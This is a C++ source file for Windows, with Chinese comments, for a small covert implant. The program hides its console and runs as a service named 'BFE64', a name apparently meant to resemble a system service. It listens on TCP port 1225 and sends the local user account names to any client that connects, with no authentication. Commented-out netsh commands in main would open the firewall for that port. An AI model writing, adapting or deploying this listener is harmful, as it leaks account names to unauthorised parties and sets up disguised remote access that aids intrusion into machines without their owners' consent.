// public_local_username.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <lm.h>
#include <windows.h>
#include <tchar.h>
#include <comdef.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#define SERVICE_NAME _T("BFE64")
#define BLIND_PORT 1225

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);

std::vector<std::wstring> get_usernames() {
    std::vector<std::wstring> usernames;
    DWORD dwLevel = 10;
    LPUSER_INFO_10 pBuf = NULL;
    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    NET_API_STATUS nStatus;

    nStatus = NetUserEnum(NULL, dwLevel, FILTER_NORMAL_ACCOUNT, (LPBYTE *)&pBuf, dwPrefMaxLen, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);

    if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
        USER_INFO_10 *pTmpBuf;
        pTmpBuf = pBuf;

        for (DWORD i = 0; i < dwEntriesRead; i++) {
            if (pTmpBuf == NULL) {
                break;
            }

            usernames.push_back(std::wstring(pTmpBuf->usri10_name));
            pTmpBuf++;
        }
    }

    if (pBuf != NULL) {
        NetApiBufferFree(pBuf);
    }

    return usernames;
}

int listensend() {
    WSADATA wsaData;
    int iResult;

    // 初始化Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    // 创建套接字
    SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_socket == INVALID_SOCKET) {
        std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // 绑定套接字
    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = INADDR_ANY;
    service.sin_port = htons(BLIND_PORT);

    if (bind(listen_socket, (SOCKADDR *)&service, sizeof(service)) == SOCKET_ERROR) {
        std::cout << "bind() failed: " << WSAGetLastError() << std::endl;
        closesocket(listen_socket);
        WSACleanup();
        return 1;
    }

    // 监听套接字
    if (listen(listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        std::cout << "Error at listen(): " << WSAGetLastError() << std::endl;
        closesocket(listen_socket);
        WSACleanup();
        return 1;
    }

    // 接受连接
    SOCKET client_socket;
    sockaddr_in client_info;
    int client_info_len = sizeof(client_info);

    while (true) {
        client_socket = accept(listen_socket, (sockaddr *)&client_info, &client_info_len);
        if (client_socket == INVALID_SOCKET) {
            std::cout << "accept() failed: " << WSAGetLastError() << std::endl;
            closesocket(listen_socket);
            WSACleanup();
            return 1;
        }

        // 获取用户名并发送给客户端
        std::vector<std::wstring> usernames = get_usernames();
        for (const std::wstring &username : usernames) {
            _bstr_t b(username.c_str());    //把wchar*转为char*
            send(client_socket, b, username.length(), 0);
            send(client_socket, "\n", 1, 0);
        }

        // 关闭客户端套接字
        closesocket(client_socket);
    }

    // 关闭套接字并清理
    closesocket(listen_socket);
    WSACleanup();
    return 0;
}

DWORD WINAPI ServiceCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
    switch (dwControl) {
    case SERVICE_CONTROL_STOP:
        // 设置服务状态为停止
        // 执行清理操作
        break;
    default:
        break;
    }

    return NO_ERROR;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    // 注册服务控制处理程序
    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerEx(SERVICE_NAME, ServiceCtrlHandler, NULL);
    if (hStatus == 0) {
        // 错误处理
        return;
    }

    // 设置服务状态
    SERVICE_STATUS status;
    ZeroMemory(&status, sizeof(status));
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    status.dwWin32ExitCode = NO_ERROR;
    status.dwServiceSpecificExitCode = 0;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;

    if (!SetServiceStatus(hStatus, &status)) {
        // 错误处理
    }

    // 在这里执行你的程序逻辑
    listensend();
}

int main() {
    // 添加入站规则
//    system("netsh advfirewall firewall add rule name=\"Allow Port BLIND_PORT (TCP-In)\" dir=in action=allow protocol=TCP localport=BLIND_PORT");
    // 添加出站规则
//    system("netsh advfirewall firewall add rule name=\"Allow Port BLIND_PORT (TCP-Out)\" dir=out action=allow protocol=TCP localport=BLIND_PORT");

    // 注册服务
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        // 错误处理
    }

    return 0;
}